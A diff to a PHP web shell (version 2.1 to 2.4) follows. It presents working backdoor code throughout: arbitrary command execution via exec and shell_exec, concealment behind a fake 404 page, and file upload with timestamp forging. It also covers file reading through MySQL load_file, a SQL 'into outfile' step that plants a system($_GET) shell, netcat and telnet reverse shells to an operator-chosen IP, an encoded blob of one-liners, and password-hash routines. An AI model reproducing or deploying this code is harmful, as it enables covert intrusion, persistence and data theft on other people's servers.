@@ -15,7 +15,7 @@ if(isset($_REQUEST['l0g1n'])) {
 if(!isset($_SESSION['l0g1n'])) {
  header("Location: http://".$_SERVER['SERVER_NAME']."/404.html");
 }
-$ver="2.1";
+$ver="2.4";
 // --------------------------------------------- globals 
 @ini_set('display_errors',0);
 @ini_set('log_errors',0);
@@ -23,6 +23,7 @@ $ver="2.1";
 @set_time_limit(0);
 @ignore_user_abort(1);
 @ini_set('max_execution_time',0);
+$pageend='</body></html>';
 $htaccesses=array('cgi' => "Options +Indexes +FollowSymLinks +ExecCGI\nAddType application/x-httpd-cgi .pl .py", 'ssi' => "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml\nAddOutputFilter INCLUDES .shtml");
 if($_POST['action']!="") {
  $_SESSION['action']=$_POST['action'];
@@ -134,9 +135,6 @@ if ($_COOKIE['d'] != "c") {
  body {
   background-color: black;
   color: white; 
- }
- .comment {
-  color: gray;
  }
  </style>';
 } else {
@@ -373,6 +371,7 @@ function sploent529($path) {
   echo ("    fail :( either there is no such file or exploit failed ");
   curl_close($ch);
   rmrf('file:');
+  echo $pageend;
   die();
  } else {
   curl_close($ch);
@@ -512,14 +511,18 @@ function dirsize($path) {
 }
 function scandire($dir) {
  if (empty($dir)) { $dir=getcwd(); }
- $dir=chdir($dir) or die('<font color="red">cannot chdir!</font> open_basedir/safe_mode on?<br><br>');
+ $dir=chdir($dir) or die('<font color="red">cannot chdir!</font> open_basedir/safe_mode on?<br><br>'.$pageend.'');
  $dir=getcwd()."/";
  $dir=str_replace("\\","/",$dir);
  if (is_dir($dir)) {
   if ($dh = opendir($dir)) {
    while (($file = readdir($dh)) !== false) {
-    if(filetype($dir . $file)=="dir") $dire[]=$file;
-    if(filetype($dir . $file)=="file")$files[]=$file;
+    if(filetype($dir.$file)=="dir") $dire[]=$file;
+    if(filetype($dir.$file)=="file" || filetype($dir.$file)=="link" || filetype($dir.$file)=="socket") $files[]=$file;
+   // if(filetype($dir.$file)=="") $files[]=$file; //debug: strange behavior of filetype() with openbasedir, it returns ""
+   // if(filetype($dir.$file)=="link") $files[]=$file;
+   // echo "file = ".$file." (".filetype($file).")<br>"; #debug
+   // if (is_link($file)) { echo " -&gt ".readlink($file); }; #debug
    }
    closedir($dh);
    @sort($dire);
@@ -533,11 +536,133 @@ function scandire($dir) {
    }
    for($i=0;$i<count($files);$i++) {
     $linkfile=$dir.$files[$i];
-    echo '<tr><td><a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();">'.$files[$i].'</a><br></td><td>File</td><td>'.view_size(filesize($linkfile)).'</td><td><font size="-1">'.date("d/m/Y H:i:s",filectime($linkfile)).'<br>'.date("d/m/Y H:i:s",filemtime($linkfile)).'<br>'.date("d/m/Y H:i:s",fileatime($linkfile)).'</font></td><td>'.owner($linkfile).'</td><td>'.substr(sprintf('%o',fileperms($linkfile)), -4).' <br>('.view_perms_color($linkfile,"string").')</td><td> <a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download">D</a> <a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();" title="Edit">E</a> <a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Delete">x</a> <a href="#" onclick="document.reqs.action.value=\'chmod\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Chmod">C</a> <a href="#" onclick="document.reqs.action.value=\'touch\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Touch">T</a></td></tr></tr>'; 
+    echo '<tr><td><a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();">'.$files[$i].'</a>';
+    echo '<br></td><td>File</td><td>'.view_size(filesize($linkfile)).'</td><td><font size="-1">'.date("d/m/Y H:i:s",filectime($linkfile)).'<br>'.date("d/m/Y H:i:s",filemtime($linkfile)).'<br>'.date("d/m/Y H:i:s",fileatime($linkfile)).'</font></td><td>'.owner($linkfile).'</td><td>'.substr(sprintf('%o',fileperms($linkfile)), -4).' <br>('.view_perms_color($linkfile,"string").')</td><td> <a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download">D</a> <a href="#" onclick="document.editor.filee.value=\''.$linkfile.'\'; document.editor.files.value=\''.$linkfile.'\'; document.editor.submit();" title="Edit">E</a> <a href="#" onclick="document.reqs.action.value=\'delete\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Delete">x</a> <a href="#" onclick="document.reqs.action.value=\'chmod\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Chmod">C</a> <a href="#" onclick="document.reqs.action.value=\'touch\'; document.reqs.file.value=\''.$linkfile.'\';document.reqs.dir.value=\''.$dir.'\'; document.reqs.submit();" title="Touch">T</a></td></tr></tr>'; 
    }
    echo "</table>";
   }
  }
+}
+// --------------------------------------------- crypt functions by Eugen
+function entityenc($str) {
+ $text_array=explode("\r\n", chunk_split($str, 1));
+ for ($n=0; $n < count($text_array) - 1; $n++) {
+  $newstring .= "&#" . ord($text_array[$n]) . ";";
+ }
+ return $newstring;
+}
+function entitydec($str) {
+ $str=str_replace(';', '; ', $str);
+ $text_array=explode(' ', $str);
+ for ($n=0; $n < count($text_array) - 1; $n++) {
+  $newstring .= chr(substr($text_array[$n], 2, 3));
+ }
+ return $newstring;
+}
+function asc2hex($str) {
+ return chunk_split(bin2hex($str), 2, " ");
+}
+function hex2asc($str) {
+ $str=str_replace(" ", "", $str);
+ for ($n=0; $n<strlen($str); $n+=2) {
+  $newstring .=  pack("C", hexdec(substr($str, $n, 2)));
+ }
+ return $newstring;
+}
+// --------------------------------------------- crypt functions by smartman
+$itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+function to64as($input,$count) {
+ global $itoa64;
+ $output = '';
+ $i = 0;
+ while ($i < $count) {
+  $value = ord($input[$i]);
+  ++$i;
+  $output .= $itoa64{$value & 0x3f};
+  if ($i < $count) $value |= (ord($input[$i]) << 8);
+  $output .= $itoa64{($value>>6) & 0x3f};
+  ++$i;
+  if ($i >= $count) break;
+  if ($i < $count) $value |= (ord($input[$i]) << 16);
+  $output .= $itoa64{($value>>12) & 0x3f};
+  ++$i;
+  if ($i >= $count) break;
+  $output .= $itoa64{($value>>18) & 0x3f};
+ }
+ return $output;
+}
+function to64na($value,$num) {
+ global $itoa64;
+ $output = '';
+ while ($num-1 >= 0) {
+  --$num;
+  $output .= $itoa64{$value & 0x3f};
+  $value >>= 6;
+ }
+ return $output;
+}
+function unap($pwd,$salt,$magic='$1$') {
+ if (substr($salt,0,strlen($magic)) == $magic) $salt = substr($salt,strlen($magic));
+ $salt = explode('$',$salt,1);
+ $salt = substr($salt[0],0,8);
+ $ctx = $pwd.$magic.$salt;
+ $final = md5($pwd.$salt.$pwd,true);
+ for ($pl=strlen($pwd);$pl>=0;$pl-=16) {
+  $ctx .= substr($final,0,($pl>16?16:$pl));
+ }
+ $i = strlen($pwd);
+ while ($i) {
+  $ctx .= ($i&1?chr(0):$pwd{0});
+  $i >>= 1;
+ }
+ $final = md5($ctx,true);
+ for ($i=0;$i<1000;++$i) {
+  $ctx1 = '';
+  $ctx1 .= ($i&1?$pwd:substr($final,0,16));
+  if ($i % 3) $ctx1 .= $salt;
+  if ($i % 7) $ctx1 .= $pwd;
+  $ctx1 .= ($i&1?substr($final,0,16):$pwd);
+  $final = md5($ctx1,true);
+ }
+ $passwd = '';
+ $passwd .= to64na(((int)ord($final{0}) << 16)|((int)ord($final{6}) << 8)|((int)ord($final{12})),4);
+ $passwd .= to64na(((int)ord($final{1}) << 16)|((int)ord($final{7}) << 8)|((int)ord($final{13})),4);
+ $passwd .= to64na(((int)ord($final{2}) << 16)|((int)ord($final{8}) << 8)|((int)ord($final{14})),4);
+ $passwd .= to64na(((int)ord($final{3}) << 16)|((int)ord($final{9}) << 8)|((int)ord($final{15})),4);
+ $passwd .= to64na(((int)ord($final{4}) << 16)|((int)ord($final{10}) << 8)|((int)ord($final{5})),4);
+ $passwd .= to64na(((int)ord($final{11})),2);
+ return $magic.$salt.'$'.$passwd;
+}
+function phpass($pwd,$salt,$count,$prefix) {
+ $hash = md5($salt.$pwd,true);
+ for ($i=0;$i<$count;++$i) {
+  $hash = md5($hash.$pwd,true);
+ }
+ return $prefix.substr($salt,0,8).to64as($hash,16);
+}
+function genSalt($salt,$length=8,$dot=0) {
+ if (strlen($salt)>=$length) return substr($salt,0,$length);
+ global $itoa64;
+ if (!$dot) { $alphabet=substr($itoa64,2); } else { $alphabet=$itoa64; }
+ $output='';
+ for ($i=0;$i<$length;++$i) $output.=$alphabet{mt_rand(0,strlen($alphabet)-1)};
+ return $output;
+}
+function mysql4($pwd) {
+ $nr = 0x50305735;
+ $nr2 = 0x12345671;
+ $add = 7;
+ $charArr = str_split($pwd);
+ foreach ($charArr as $char) {
+  if (in_array($char,array(' ','\n'))) continue;
+  $charVal = ord($char);
+  $nr ^= ((($nr & 63)+$add) * $charVal)+($nr << 8);
+  $nr &= 0x7fffffff;
+  $nr2 += ($nr2 << 8) ^ $nr;
+  $nr2 &= 0x7fffffff;
+  $add += $charVal;
+ }
+ return sprintf('%08x%08x',$nr,$nr2);
 }
 // --------------------------------------------- main code 
 if (!isset($_REQUEST['p'])) { $_REQUEST['p']="s"; }
@@ -615,7 +740,7 @@ switch ($_REQUEST['p']) {
    } else {
     echo "<br>fail, no ssh2.so here";
    }
-   echo "</body></html>";
+   echo $pageend;
   } else {
    if ($download != "1") {
     echo $title;
@@ -697,7 +822,7 @@ switch ($_REQUEST['p']) {
      break;
     case "exec":
      exec($_POST["command"]." 2>&1",$out);
-     print_r($out);
+     echo join("\n",$out);
      break;
     case "shell_exec":
      $out=shell_exec($_POST["command"]." 2>&1");
@@ -776,11 +901,13 @@ switch ($_REQUEST['p']) {
   if ($download != "1") {
    echo $title;
    echo "<font color=\"gray\">";
-   echo "current dir: ".$_SERVER["DOCUMENT_ROOT"]."<br>";
+   echo "current dir: ".getcwd()."<br>";
    sploent516();
    echo "<br>--------------------------------<br></font>";
   }
-  if (empty($_POST["filer"]) and $download != "1") {
+  if (empty($_POST["filer"]) and $download != "1" and empty($_POST["edt"]) and empty($_POST["sqlr"]) and empty($_POST["sqlu"]) and empty($_POST["upload"])) {
+  echo '<a href="#" onclick="showTooltip(7)" id="link"> &gt;&gt; read/upload/edit file &lt;&lt; </a><br><br>
+  <div id="7" style="display: none">';
    $ololotext="/home/USER/public_html/DOMAIN/index.php";
    echo '<font color="blue">---> read file </font><br>';
    echo "php file_get_contents:<br>";
@@ -810,11 +937,12 @@ switch ($_REQUEST['p']) {
        echo '<font color="gray">';
        echo "<textarea cols=\"80\" rows=\"40\">";
       }
-      $contents=file_get_contents($_POST["filename"]) or die("failed. bad permissions or no such file?");
+      $contents=file_get_contents($_POST["filename"]) or die("failed. bad permissions or no such file?".$pageend."");
       echo $contents;
       if ($download != "1") {
        echo "</textarea>";
       }
+      echo $pageend;
       die(); 
      }
      break;  
@@ -836,7 +964,7 @@ switch ($_REQUEST['p']) {
    }
   }
   // curl + file_get_contents end
-  if ($download != "1") {
+  if ($download != "1" and empty($_POST["edt"]) and empty($_POST["sqlu"])) {
    echo "<br>mysql:<br>";
    if (empty($_POST["sqlr"])) {
     $user="root";
@@ -855,20 +983,22 @@ switch ($_REQUEST['p']) {
    }
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">user <input name="user" type="text" maxlength="500" size="10" value="'.$user.'"> password <input name="pass" type="text" maxlength="500" size="10" value="'.$pass.'"> host <input name="host" type="text" maxlength="500" size="10" value="'.$host.'">:<input name="port" type="text" maxlength="5" size="5" value="'.$port.'"> database <input name="db" type="text" maxlength="500" size="10" value="'.$db.'"><font color="gray">(needed for `load data infile`)</font><br><input name="wut" value="load_file" type="radio" checked>load_file<br><input name="wut" value="infile" type="radio">load data infile <font color="gray">(use it for binary files)</font><br><input name="file" type="text" maxlength="500" size="40" value="'.$file.'"> <input type="submit" value="go"><input name="sqlr" type="hidden" value="yup"><br><input name="p" type="hidden" value="f"></form>';
    if (!empty($_POST["sqlr"])) {
-    $link=mysql_connect("".$host.":".$port."",$user,$pass) or die("cant connect: ".mysql_error());
+    $link=mysql_connect("".$host.":".$port."",$user,$pass) or die("cant connect: ".mysql_error()."".$pageend."");
     switch ($_POST['wut']) {
     case "load_file":
      $q='SELECT load_file("'.$_POST["file"].'")';
-     $rez=mysql_query($q,$link) or die("query error:".mysql_error());
+     $rez=mysql_query($q,$link) or die("query error:".mysql_error()."".$pageend."");
      echo "result:<br>";
      echo "<textarea cols=\"80\" rows=\"20\">";
      echo mysql_result($rez,0);
      echo "</textarea><br>";
+     echo $pageend;
+     die();
      break;
     case "infile":
-     mysql_select_db($db) or die ("cannot select db: ".mysql_error());
-     mysql_query("CREATE TABLE `file` ( `text` LONGBLOB NOT NULL );") or die ("cannot create table: ".mysql_error()); 
-     mysql_query("LOAD DATA INFILE \"".$_POST["file"]."\" INTO TABLE file LINES TERMINATED BY '' (`text`)") or die ("cannot load data: ".mysql_error());
+     mysql_select_db($db) or die ("cannot select db: ".mysql_error()."".$pageend."");
+     mysql_query("CREATE TABLE `file` ( `text` LONGBLOB NOT NULL );") or die ("cannot create table: ".mysql_error()."".$pageend.""); 
+     mysql_query("LOAD DATA INFILE \"".$_POST["file"]."\" INTO TABLE file LINES TERMINATED BY '' (`text`)") or die ("cannot load data: ".mysql_error()."".$pageend."");
      $rez=mysql_query("SELECT * FROM file;");
      if (!$rez) { echo "fail. permission denied?<br>"; }
      else {
@@ -904,8 +1034,9 @@ switch ($_REQUEST['p']) {
        echo '<table border=0 cellspacing="1" cellpadding="4"><tr><td>'.$a0.'</td><td>'.$a1.'</td><td>'.$a2.'</td></tr></table><br>';
       }
       mysql_free_result($result);
-      mysql_query("DROP TABLE file;") or die("cannot drop table: ".mysql_error());
+      mysql_query("DROP TABLE file;") or die("cannot drop table: ".mysql_error()."".$pageend."");
      }
+     echo $pageend;
      die();
     break;
     }
@@ -913,10 +1044,10 @@ switch ($_REQUEST['p']) {
    }
   }
   // mysql read file end. upload
-   if ($download != "1") {
+   if ($download != "1" and empty($_POST["edt"])) {
     echo '<br><font color="blue">---> upload file</font><br>';
     if (!ini_get('file_uploads')) {
-     echo "file_uploads Off";
+     echo "php file_uploads Off<br>";
     } else {
      echo "<font color=\"gray\">post_max_size: ".ini_get('post_max_size')."<br>"; 
      echo "upload_max_filesize: ".ini_get('upload_max_filesize')."<br>"; 
@@ -943,16 +1074,51 @@ switch ($_REQUEST['p']) {
        } else {
         $upname=$_FILES["sourcefile"]["name"];
        }
-       move_uploaded_file($_FILES["sourcefile"]["tmp_name"], $_POST['filedir']."/".$upname) or die("<br>moving failed!<br>");
+       move_uploaded_file($_FILES["sourcefile"]["tmp_name"], $_POST['filedir']."/".$upname) or die("<br>moving failed!<br>".$pageend."");
        echo "<br>moving done, trying to touch (old time of ".$_POST['filedir']." = ".date("d/m/Y H:i:s",$dirtime).")<br>";
-       touch($_POST['filedir']."/".$upname,$dirtime,$dirtime) or die ("<br>touch failed!<br>");
+       touch($_POST['filedir']."/".$upname,$dirtime,$dirtime) or die ("<br>touch failed!<br>".$pageend."");
        echo "file touched: new time of ".$upname." = ".date("d/m/Y H:i:s",filemtime($_POST['filedir']."/".$upname)).". trying to touch dir<br>";
-       touch($_POST['filedir'],$dirtime,$dirtime) or die ("<br>touch dir failed!<br>");
+       touch($_POST['filedir'],$dirtime,$dirtime) or die ("<br>touch dir failed!<br>".$pageend."");
        echo "dir touched: new time of ".$_POST['filedir']." = ".date("d/m/Y H:i:s",filemtime($_POST['filedir']))."<br>";
       } else {
        echo("<br>upload failed!<br>");
       }
      }
+    }
+    if ($download != "1" and empty($_POST["edt"])) {
+     echo "<br>mysql:<br>";
+     if (empty($_POST["sqlu"])) {
+      $user="root";
+      $pass="12345";
+      $db="test";
+      $host="localhost";
+      $port="3306";
+      if (empty($_POST["dir"])) {
+       $dir=getcwd();
+      } else {
+       $dir=$_POST["dir"];
+      }
+      $file=$dir."/shell.php";
+      $evilcodez='<?php system($_GET["command"]); ?>';
+     } else {
+      $user=$_POST['user'];
+      $pass=$_POST['pass'];
+      $db=$_POST['db'];
+      $host=$_POST['host'];
+      $port=$_POST['port'];
+      $file=$_POST['file'];
+      $evilcodez=$_POST['evilcodez'];
+     }
+     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">user <input name="user" type="text" maxlength="500" size="10" value="'.$user.'"> password <input name="pass" type="text" maxlength="500" size="10" value="'.$pass.'"> host <input name="host" type="text" maxlength="500" size="10" value="'.$host.'">:<input name="port" type="text" maxlength="5" size="5" value="'.$port.'"><br> select <br><textarea name="evilcodez" cols="80" rows="4">'.$evilcodez.'</textarea><br>into outfile <input name="file" type="text" maxlength="500" size="40" value="'.$file.'"> <input type="submit" value="go"><input name="sqlu" type="hidden" value="yup"><br><input name="p" type="hidden" value="f"></form>';
+    }
+    if (!empty($_POST["sqlu"])) {
+     $link=mysql_connect("".$host.":".$port."",$user,$pass) or die("cant connect: ".mysql_error()."".$pageend."");
+     $q='SELECT \''.mysql_real_escape_string($_POST['evilcodez']).'\' INTO OUTFILE "'.$_POST["file"].'"';
+     $rez=mysql_query($q,$link) or die("query error:".mysql_error());
+     echo "done<br>";
+     mysql_close($link);
+     echo $pageend;
+     die();
     }
     echo "<br>";
     echo '<font color="blue">---> edit file</font><br>';
@@ -976,7 +1142,7 @@ switch ($_REQUEST['p']) {
     $files=trim($_POST["files"]);
     if (!file_exists($files)) {
      if (!fopen($files,'a+')) {
-      echo '<font color="red">'.$files.' isnt writable! (cannot open "a+")<br></font>';die();
+      echo '<font color="red">'.$files.' isnt writable! (cannot open "a+")<br></font>'; echo $pageend; die();
      } else {
       if (!file_exists($filee)) {
        echo '<font color="gray"> no file '.$filee.', I`ll create new '.$files.'.</font><br>';
@@ -990,7 +1156,7 @@ switch ($_REQUEST['p']) {
      if (!is_writable($files)) {
       $chmoded=substr(sprintf('%o',fileperms($files)), -4);
       echo '<font color="gray">'.$files.' chmod '.$chmoded.', trying to chmod 0666</font>';
-      chmod($files, 0666) or die ('<font color="red"><br>cannot chmod '.$files.' 666!');
+      chmod($files, 0666) or die ('<font color="red"><br>cannot chmod '.$files.' 666!'.$pageend.'');
       echo '<font color="gray"> ...done</font>';
      }
     }
@@ -1001,9 +1167,9 @@ switch ($_REQUEST['p']) {
      }
      if (isset($_POST['filec'])) {
       $filec=$_POST['filec'];
-      $fh=fopen($files,"w+") or die ('<font color="red">cannot fopen "w+"!</font>');
+      $fh=fopen($files,"w+") or die ('<font color="red">cannot fopen "w+"!</font>'.$pageend.'');
       fputs($fh,$filec);
-      fclose($fh) or die ('<font color="red">cannot save file!</font>');
+      fclose($fh) or die ('<font color="red">cannot save file!</font>'.$pageend.'');
       if (isset($_POST['chmoded'])) {
        echo "chmoding to old perms(".trim($_POST['chmoded']).")<br>";
        $perms = 0;
@@ -1016,7 +1182,7 @@ switch ($_REQUEST['p']) {
       $time=explode(":",$date[1]);
       $unixtime=mktime($time[0],$time[1],$time[2],$day[1],$day[2],$day[0]);
       @touch($files,$unixtime,$unixtime);
-      die('<br><font color="green"> -&gt '.$files.' saved!</font>');
+      die('<br><font color="green"> -&gt '.$files.' saved!</font>'.$pageend.'');
      }
      if (empty($oldtime)) {
       $ttime=time();
@@ -1029,11 +1195,11 @@ switch ($_REQUEST['p']) {
      }
      echo '<input name="edit" type="hidden" value="edit"><br><input type="submit" name="edt" value="save"></form>';
     }
+    echo $pageend;
     die();
    }
    if ($download != "1") {
-    echo "<br>";
-    echo '<font color="blue">---> filemanager</font><br>';
+    echo '<br></div><font color="blue">---> fail manager</font><br>';
    }
    if ($action=="viewer") {
     if (!isset($dir)) {
@@ -1041,7 +1207,7 @@ switch ($_REQUEST['p']) {
     }
     scandire($_POST["dir"]);
    }
-   if ($action=="download") { 
+   if ($action=="download") {
     readfile($_POST["file"]);
    }
    if ($action=="chmod") {
@@ -1066,9 +1232,10 @@ switch ($_REQUEST['p']) {
    if ($download != "1") {
     echo '<br>';
     echo '<form name="reqs" method="post" action="'.$_SERVER["PHP_SELF"].'"><input name="action" type="hidden" value=""><input name="dir" type="hidden" value=""><input name="file" type="hidden" value=""><input name="p" type="hidden" value="f"></form>';
+    echo $pageend;
    }
   break;
-// --------------------------------------------- file end; bind
+// --------------------------------------------- file operations end; bind
  case "b":
   echo $title;
   echo '<a href="#" onclick="showTooltip(1)" id="link"> &gt;&gt; help &lt;&lt; </a>
@@ -1096,7 +1263,7 @@ switch ($_REQUEST['p']) {
    echo "<br>"; //debug: sometimes page cut here, when passthru system shell_exec are disabled
    echo '<font color="green"> - - - - = = = = &gt; &gt; one-liners</font><br><a href="#" onclick="showTooltip(4)" id="link4"> &gt;&gt; show code &lt;&lt; </a>
    <div id="4" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none"><textarea cols="80" rows="20">
-'.gzinflate(base64_decode("nZLRq5swFMbf/SsOIq0Bjbfdm6lCue1Axr0t1bcxShvjKtUkJHZdWbe/fYkWrhv3YezFk3zE7/yS7xwP+hQ78LSYzOYfCPvOKJjFIo1K9i3qqIyyLV6uVni3xnkebTe7goA+QX8c0v4774vjSKYaY2ULhC/ZBkIGU08mlVBn41x3QV35nkTEowlnV8g2cZwLemZdHGev68LfMqaWZakCd9w0tk1dRPJilb2GaVUKybjv0UAZp19j4YqIvumOtd4erqe6YYuUTB1HXY43w2ULhEr3HXs2ywR1BT0gTYrn7YCDDZ3/B4MbuA+K3tenbZlQ/JV1GpFsg2VPYMTAVS76ca/FnWKpam7sBVbsUP5kvDQonFqQFsIKoq6VEeaUlwTaMxflSAEJkwlwCmMGsAQmqNGxO0THmkcmj1n6JjtOxxpuXvXfWw0//G87eetOgtvo+wWEFKZ1K4XqYHjtQF+OUgnKtA6EJjoZZDwU/7FbftzbMQge23zz/GmfF7v18sXkiqngnNHO/zsYi4kQERqXFzn3Na5MQFz4KHhCBN6RZ+/Lc0Rk8saJ6aFp/M/u48ZmAMLa/YLsPP0G")).'</textarea></div><br>';
+'.gzinflate(base64_decode("pZLRq5swFMbf/SsOIq0Bjbfdm6lCue1Axr2W6tsYpU3iKtUkJHZdWe/+9kVbmBv3YbAXT/IRv/NLvnPYm2PswNNiMpt/IPw7p2AXizRi/FvUURVlG7xcrfB2jYsi2uTbkoA5wnAc0uE7H4rjKK4ba9UXCF+yHEIOU08lldQn61x3QV35nkLEo4ngF8jyOC4kPfEujrPXdelvONdLxnTgjpvGfVMXkaJcZa9hWjGpuPA9Gmjr9HMsXBAxV9Px1tvB5Vg3fJGSqePo8+FqufoCoTZDx4GtZ4K6ggGQJuXz5o6DLZ3/B4MbuA+KwdenLUso/so7g0iWYzUQWDFwtYt+3Gp5o1jpWlh7iTXfszcumEURtAdpIawg6loVYUEFI9CehGQjBRRMJiAojBmgJ7BBjY7dIDrUIrJ5zNKR3AfiOB1vhH3af+93/+G/eqprd5SiH4JhASGFad0qqTu4v3tgzgelJeXGBNIQk9xlfC/+Y7f8uOsHInhsi/z5064ot+vli00YUykEp53/d0Q9K0JEGszOau4bXNmohPRR8IQIvCPP3pfniKjkNyem+6bxP7uPa9tRCGv3C7KT9Qs=")).'</textarea></div><br>';
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">backconnect to <input name="ip" type="text" maxlength="15" size="15" value="123.123.123.123">:<input name="port" type="text" maxlength="5" size="5" value="1337"><input name="p" type="hidden" value="b"> using <br>';
    $searchvar=trim(search("bash",$failflag));
    if (empty($searchvar)) {
@@ -1153,12 +1320,12 @@ switch ($_REQUEST['p']) {
       echo "done<br>";
      break;
      case "nc":
-      $c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && nc '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd';
+      $c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && nc '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&1';
       run($c);
       echo "done<br>";
      break;
      case "telnet":
-      $c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && telnet '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd';
+      $c='rm -f /tmp/.ncnd; mknod /tmp/.ncnd p && telnet '.$_POST['ip'].' '.$_POST['port'].' 0</tmp/.ncnd | /bin/sh 1>/tmp/.ncnd 2>&1';
       run($c);
       echo "done<br>";
      break;
@@ -1521,14 +1688,16 @@ switch ($_REQUEST['p']) {
     break;
    }
   }
-  echo "</body></html>";
+  echo $pageend;
   break;
 // --------------------------------------------- bind end; extras 
  case "e":
   if (empty($_POST["extraz"]) and $download != "1") {
    echo $title; 
    echo '<font color="blue">---> SysInfo</font><br>';
-   echo '<span class="comment">SERVER_ADDR: '.getenv('SERVER_ADDR').'<br>';
+   echo '<br><a href="#" onclick="showTooltip(6)" id="link5"> &gt;&gt; show &lt;&lt; </a>
+   <div id="6" style="background-color: #bbbbbb; color: #000000; position: absolute; border: 1px solid #FF0000; display: none">';
+   echo 'SERVER_ADDR: '.getenv('SERVER_ADDR').'<br>';
    echo 'REMOTE_ADDR: '.getenv('REMOTE_ADDR').'<br>';
    echo 'HTTP_X_FORWARDED_FOR: '.getenv('HTTP_X_FORWARDED_FOR').'<br>';
    echo 'HTTP_PROXY_CONNECTION: '.getenv('HTTP_PROXY_CONNECTION').'<br>';
@@ -1605,7 +1774,7 @@ switch ($_REQUEST['p']) {
    } else {
     echo "<br>posix.so not loaded, can't get user information";
    }
-   echo "<br><br></span>";
+   echo "</div><br><br>";
    echo '<font color="blue">---> Extraz</font><br><br>';
    if (!function_enabled('phpinfo')) { echo "fail, phpinfo() is disabled<br><br>"; 
    } else {
@@ -1677,58 +1846,52 @@ switch ($_REQUEST['p']) {
    echo "fast URL-encoder:<br>";
    echo '<form onsubmit="return false;" action="javascript;"><textarea cols="80" rows="4" id="dencoder"></textarea><div><input type="button" onclick="decode()" value="Decode"> <input type="button" onclick="encode()" value="Encode"></div></form>';
    echo "<br>other encoders: ";
-   //code by Eugen
    $cryptform="<form action=\"".$_SERVER['PHP_SELF']."\" method=\"post\">
    <input name=\"p\" type=\"hidden\" value=\"e\">
    <textarea name=\"text\" cols=\"80\" rows=\"4\">";
-   if(isset($_POST["text"])) { $cryptform.=$_POST["text"]; }
+   if(isset($_POST["text"])) { 
+    $cryptform.=$_POST["text"];
+    $hash=$_POST['hash'];
+    $hash1=$_POST['hash1'];
+    $hash2=$_POST['hash2'];
+   } else {
+    $hash=genSalt('zxcv',8);
+    $hash1=genSalt('zxcv',8);
+    $hash2=genSalt('zxcv',6,1);
+   }
    $cryptform.="</textarea><br>
    <select name=\"cryptmethod\"> 
-   <option value=\"asc2hex\">ASCII to Hex</option> 
-   <option value=\"hex2asc\">Hex to ASCII</option> 
-   <option value=\"b64enc\">Base 64 Encode</option> 
-   <option value=\"b64dec\">Base 64 Decode</option> 
-   <option value=\"crypt\">DES Crypt</option> 
-   <option value=\"entityenc\">HTML Entities Encode</option> 
-   <option value=\"entitydec\">HTML Entities Decode</option> 
-   <option value=\"md5\">MD5 Crypt</option>
-   <option value=\"md5md5\">MD5(MD5) Crypt</option>
-   <option value=\"sha1\">SHA1 Crypt</option>
-   <option value=\"mysql5\">MYSQL5 Hash</option>
-   </select><br>
+   <option value=\"asc2hex\"".($_POST["cryptmethod"] == "asc2hex"?" selected":"").">ASCII to Hex</option> 
+   <option value=\"hex2asc\"".($_POST["cryptmethod"] == "hex2asc"?" selected":"").">Hex to ASCII</option> 
+   <option value=\"b64enc\"".($_POST["cryptmethod"] == "b64enc"?" selected":"").">Base64 Encode</option> 
+   <option value=\"b64dec\"".($_POST["cryptmethod"] == "b64dec"?" selected":"").">Base64 Decode</option> 
+   <option value=\"crypt\"".($_POST["cryptmethod"] == "crypt"?" selected":"").">DES</option> 
+   <option value=\"entityenc\"".($_POST["cryptmethod"] == "entityenc"?" selected":"").">HTML Entities Encode</option> 
+   <option value=\"entitydec\"".($_POST["cryptmethod"] == "entitydec"?" selected":"").">HTML Entities Decode</option> 
+   <option value=\"md5\"".($_POST["cryptmethod"] == "md5"?" selected":"").">MD5</option>
+   <option value=\"md5md5\"".($_POST["cryptmethod"] == "md5md5"?" selected":"").">MD5(MD5)</option>
+   <option value=\"md5unix\"".($_POST["cryptmethod"] == "md5unix"?" selected":"").">MD5(Unix - \$1\$)</option>
+   <option value=\"md5wp\"".($_POST["cryptmethod"] == "md5wp"?" selected":"").">MD5(WordPress - \$P\$B)</option>
+   <option value=\"md5bb\"".($_POST["cryptmethod"] == "md5bb"?" selected":"").">MD5(PHPBB3 - \$H\$9)</option>
+   <option value=\"md5apr\"".($_POST["cryptmethod"] == "md5apr"?" selected":"").">MD5(APR1 - \$apr1\$)</option>
+   <option value=\"blowfish\"".($_POST["cryptmethod"] == "blowfish"?" selected":"").">Blowfish - \$2a\$</option>
+   <option value=\"sha1\"".($_POST["cryptmethod"] == "sha1"?" selected":"").">SHA1</option>
